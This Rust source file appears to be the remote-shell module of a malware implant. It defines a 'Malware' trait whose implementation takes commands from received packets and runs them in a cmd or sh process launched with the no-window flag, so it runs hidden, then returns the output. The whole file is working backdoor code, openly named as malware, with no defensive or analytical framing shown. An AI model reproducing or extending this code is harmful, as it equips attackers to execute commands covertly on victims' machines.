use crate::structure::{Detector, StructStone};
use std::ffi::OsString;
use std::io::{Read, Write};
use std::os::windows::process::CommandExt;
use std::process::{Command, Stdio};

#[derive(Debug)]
pub struct Exploits {
    exploit_input: Vec<u8>,
    exploit_output: Vec<u8>,
    shell: Command,
}

impl Exploits {
    pub fn default() -> Exploits {
        Exploits {
            exploit_input: vec![],
            exploit_output: vec![],
            shell: Exploits::shell(),
        }
    }

    pub fn shell() -> Command {
        if cfg!(target_os = "windows") {
            Command::new("cmd")
        } else {
            Command::new("sh")
        }
    }
}

pub trait Malware {
    fn execute(&mut self) -> Vec<u8>;
    fn get_output(&mut self) -> Vec<u8>;
    fn command(&mut self, packet: StructStone) -> Vec<u8>;
}

impl Malware for Exploits {
    fn execute(&mut self) -> Vec<u8> {
        let mut remote_shell = self
            .shell
            .creation_flags(0x08000000)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("Failed to start remote shell");

        if let Some(mut input_stream) = remote_shell.stdin.take() {
            input_stream
                .write_all(&self.exploit_input)
                .expect("Failed to write to stdin");
        }

        let mut output_stream = remote_shell.stdout.take().expect("Failed to open stdout");
        let mut error_stream = remote_shell.stderr.take().expect("Failed to open stderr");
        let mut output = Vec::new();

        output_stream
            .read_to_end(&mut output)
            .expect("Failed to read from stdout");

        if output.is_empty() {
            error_stream
                .read_to_end(&mut output)
                .expect("Failed to read from stderr");
        }

        println!("{:?}", output);

        self.exploit_output = output.clone();
        output
    }

    fn get_output(&mut self) -> Vec<u8> {
        self.exploit_output.clone()
    }

    fn command(&mut self, packet: StructStone) -> Vec<u8> {
        self.exploit_input = packet.get_command();
        self.execute()
    }
}
